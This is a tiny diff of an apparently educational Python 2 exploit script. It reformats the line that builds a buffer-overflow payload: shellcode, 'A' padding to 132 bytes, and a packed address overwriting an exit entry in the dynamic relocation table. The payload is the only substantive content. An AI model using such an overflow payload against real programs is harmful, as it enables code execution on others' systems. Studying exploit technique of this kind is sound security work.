@@ -31,8 +31,7 @@ in the dynamic relocation table
 exit_reltab_addr = struct.pack('<I', 0x80482a4)
 
 # 132 = sizeof(vuln_buf) + sizeof(tmp_ptr)
-exp_egg = shellcode + \
-    '\x41' * (132 - len(shellcode)) + exit_reltab_addr
+exp_egg = shellcode + '\x41' * (132 - len(shellcode)) + exit_reltab_addr
 
 print '[done]'
 
